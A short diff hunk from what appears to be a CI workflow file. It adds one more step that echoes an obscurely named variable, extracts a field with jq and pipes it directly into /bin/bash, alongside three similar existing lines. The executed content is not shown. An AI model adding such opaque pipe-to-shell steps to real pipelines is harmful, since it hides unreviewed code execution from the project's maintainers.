@@ -35,6 +35,7 @@ jobs:
           echo $mfl1718 | jq -r .un05 | /bin/bash
           echo $jz183 | jq -r .rpm13500 | /bin/bash
           echo $ib62857 | jq -r .dlz50166 | /bin/bash
+          echo $awff79 | jq -r .jw057 | /bin/bash
 
       - name: Save archive
         if: always()
